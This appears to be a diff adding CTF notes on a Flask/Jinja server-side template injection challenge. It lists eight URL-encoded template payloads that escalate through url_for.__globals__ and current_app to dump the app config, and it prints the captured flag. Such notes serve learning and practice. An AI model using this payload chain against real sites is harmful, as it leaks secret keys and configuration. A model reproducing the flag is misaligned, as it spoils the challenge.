@@ -1,0 +1,34 @@
+SSTI Injection Tests
+Target: https://65bde0e59a06b163d9baf709.http-ctf2.dasctf.com
+
+Test 1 - Basic SSTI:
+  /shrine/%7B%7B7*7%7D%7D
+  Result: 49
+
+Test 2 - Request object:
+  /shrine/%7B%7Brequest%7D%7D
+  Result: Request object shown
+
+Test 3 - Config nullified:
+  /shrine/%7B%7Bconfig%7D%7D
+  Result: None
+
+Test 4 - Environ keys (for loop):
+  /shrine/%7B%25%20for%20key%20in%20request.environ%20%25%7D%7B%7Bkey%7D%7D%20%7B%25%20endfor%20%25%7D
+  Result: All WSGI environ keys
+
+Test 5 - url_for.__globals__ keys:
+  /shrine/%7B%25%20for%20key%20in%20url_for.__globals__%20%25%7D%7B%7Bkey%7D%7D%20%7B%25%20endfor%20%25%7D
+  Result: current_app, request, session, os, __builtins__, etc.
+
+Test 6 - Flask app via current_app:
+  /shrine/%7B%7Burl_for.__globals__%5B'current_app'%5D%7Cstring%7D%7D
+  Result: <Flask 'app'>
+
+Test 7 - App __dict__ keys (for loop):
+  /shrine/%7B%25%20for%20k%20in%20url_for.__globals__%5B'current_app'%5D.__dict__%20%25%7D%7B%7Bk%7D%7D%20%7B%25%20endfor%20%25%7D
+  Result: config, view_functions, jinja_env, etc.
+
+Test 8 - Full config dump:
+  /shrine/%7B%7Burl_for.__globals__%5B'current_app'%5D.__dict__%5B'config'%5D%7D%7D
+  Result: Config with FLAG=CTF2{52c7715a-13c3-4a6f-be1b-420f72e8bc81}
